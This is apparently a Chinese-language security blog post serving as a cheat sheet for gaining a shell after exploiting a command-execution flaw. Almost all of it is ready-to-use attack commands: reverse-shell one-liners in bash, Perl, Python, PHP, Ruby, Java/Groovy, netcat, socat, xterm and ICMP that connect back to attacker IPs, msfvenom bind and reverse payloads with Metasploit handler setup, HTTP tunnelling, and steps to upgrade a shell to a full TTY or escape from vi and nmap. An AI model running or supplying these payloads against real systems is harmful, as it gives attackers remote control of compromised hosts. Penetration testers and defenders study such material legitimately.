---
title: '获取shell'
layout: post
tags: 
  - shell
  - command
  - reverseshell
category: 
  - hack
  - sec
comments: true
share: true
---

* TOC
{:toc}

<!--more-->

在得到命令执行漏洞情况下，需要一个交互式shell。无法添加新的账户，或者写入密钥到`~/.ssh/`文件夹下，下一步就是将bash绑定到TCP端口上进行shell反弹。

# 反弹shell

## Bash

```bash
bash -i >& /dev/tcp/10.10.10.16/4444 0>&1
```

## Perl

```perl
perl -e 'use Socket;$i="10.10.10.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


## PHP

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## revsh.groovy

```java
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
require('child_process').exec('bash -i >& /dev/tcp/1.2.3.4/80 0>&1');
```

## netcat 

```bash
nc -e /bin/sh 10.0.0.1 1234
```

不支持`-e`选项，也可以：

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

## Go

[Hershell](https://github.com/sysdream/hershell):Go语言编写的多平台化的反向shell

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## [assembly](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/)

[汇编反向shell](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/)

## Xterm

最简单的反向shell是xterm 会话，气将通过TCP的6001端口反向连接10.0.0.1：

```bash
xterm -display 10.0.0.1:1
```

要捕获传入的xtrem，就启动`X-Server`(:1监听6001的TCP端口)，另外就是可以通过Xnest监听

```bash
Xnest :1
```


```bash
xhost +targetip
```

# icmp-shell

见[icmpsh](https://github.com/inquisb/icmpsh)

kali：

```bash
./run.sh
```

target:

```bash
icmpsh.exe -t kali_ip -d 500 -b 30 -s 128
```

# tunna+kali_bind

见[Shell反弹不出来怎么办呢？](http://www.91ri.org/11722.html)

本机kali不是外网或者目标在dmz里面反弹不出shell，可以通过这种直连shell然后再通过http的端口转发到本地的metasploit

0x01 在kali上生成一个bind_shell:

```bash
msfvenom -p windows/x64/shell/bind_tcp LPORT=12345 -f exe -o ./shell.exe
```

0x02 在kali上使用tunna转发：

```bash
python proxy.py -u http://test.com/conn.jsp  -l 1111 -r 12345 v
```

0x03 使用kali连接bind_shell:

```bash
use exploit/multi/handler
set payload windows/x64/shell/bind_tcp
set LPORT 1111
set RHOST 127.0.0.1
```

# 将普通shell升级为全交互式终端

见[Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/):https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/


非交互式的终端缺点很多：
- 标准错误信息不会显示
- 不能正常使用vim
- 没有命令补全
...

## NC反向Shell

攻击机器进行nc监听：

```bash
nc -nvlp 8888
```

![](/img/hack/tty_shell/nc_listen.png)

被攻击机器:

```bash
nc -e /bin/sh 10.10.10.166 8888
```

![](/img/hack/tty_shell/nc_connect.png)

## msf的payload shell

查找msf生成正向shell或者反向shell的payload：

```bash
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```

![](/img/hack/tty_shell/msf_payload.png)

使用msfvenom生成`reverse_netcat`:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.10.166 LPORT=8888 R
```

生成结果：

```bash
mknod /tmp/pqgi p; nc 10.10.10.166 8888 0</tmp/pqgi | /bin/sh >/tmp/pqgi 2>&1; rm /tmp/pqgi
```

![](/img/hack/tty_shell/reverse_netcat_r.png)

监听连接如下：


![](/img/hack/tty_shell/nc_connect_unix_cmd_netcat.png)

**在没有netcat的情况下，使用perl生成反向连接：**

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.166 LPORT=8888 R
```

生成结果如下：

```bash
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.10.166:8888");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```

![](/img/hack/tty_shell/reverse_perl_r.png)
![](/img/hack/tty_shell/nc_connect_unix_cmd_perl.png)

不能使用`su`等功能，功能很少：

![](/img/hack/tty_shell/python_tty_nosu.png)

### python的伪终端

使用python命令生成伪终端：

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

*解决了`su`功能，但是没有补全等功能。*

![](/img/hack/tty_shell/python_tty.png)

### Socat

[Socat](http://www.dest-unreach.org/socat/doc/socat.html)类似于netcat，通过TCP进行连接，若在受害者服务器上安装了socat，就可以通过其反弹一个反向shell


在靶机上安装socat:

```bash
sudo apt-get install socat
```
> 可在`https://github.com/andrew-d/static-binaries`下载，然后改变权限`chmod +x socat`

首先在kali运行监听：

```bash
socat file:`tty`,raw,echo=0 tcp-listen:8888
```

在靶机上反弹shell:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.166:8888
```

得到一个完整的tty会话，有完整的交互功能

![](/img/hack/tty_shell/socat.png)

### 升级netcat

基本的步骤：

```bash
//在kali得到的反向shell中：
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z //暂停shell窗口

//在kali的Terminal:
echo $TERM // 获取xterm-256color
stty -a //得到rows,columns
stty raw -echo 
fg //恢复nc监听的shell
reset

//在kali得到的反向shell中：
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

在得到反向shell之后，使用python得到伪tty，并`Ctrl-Z`暂停反向shell，放于后台：

```bash
nc -nvlp 4444
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

![](/img/hack/tty_shell/netcat_upgrade_stopped.png)

获取TERM的信息和当前tty的窗口大小：

```bash
echo $TERM

stty -a

stty raw -echo
```

![](/img/hack/tty_shell/netcat_upgrade_stty_a.png)

输入`fg`，后车之后，得到原始的`nc -nvlp 4444`，继续输入`reset`，恢复反向shell.
然后根据之前获取的信息设置shell，就可以得到一个功能完整的tty交互shell：

```bash
fg

reset

export SHELL=bash
export TERM=xterm256-color
stty rows 24 columns 80
```

![](/img/hack/tty_shell/netcat_upgrade_full_tty.png)


# Shell Spawning

http://netsec.ws/?p=337


```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

```bash
echo os.system('/bin/bash')
````

```bash
/bin/sh -i
```

```perl
perl —e 'exec "/bin/sh";'
```

```perl
perl: exec "/bin/sh";
```

```ruby
ruby: exec "/bin/sh"
```

```lua
lua: os.execute('/bin/sh')
```

## From within IRB

```bash
exec "/bin/sh"
```


## From within vi

```bash
:!bash
```

## From within vi

```bash
:set shell=/bin/bash:shell
```

## From within nmap

```
!sh
```

# refer：

- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- http://www.91ri.org/11722.html
- http://netsec.ws/?p=337
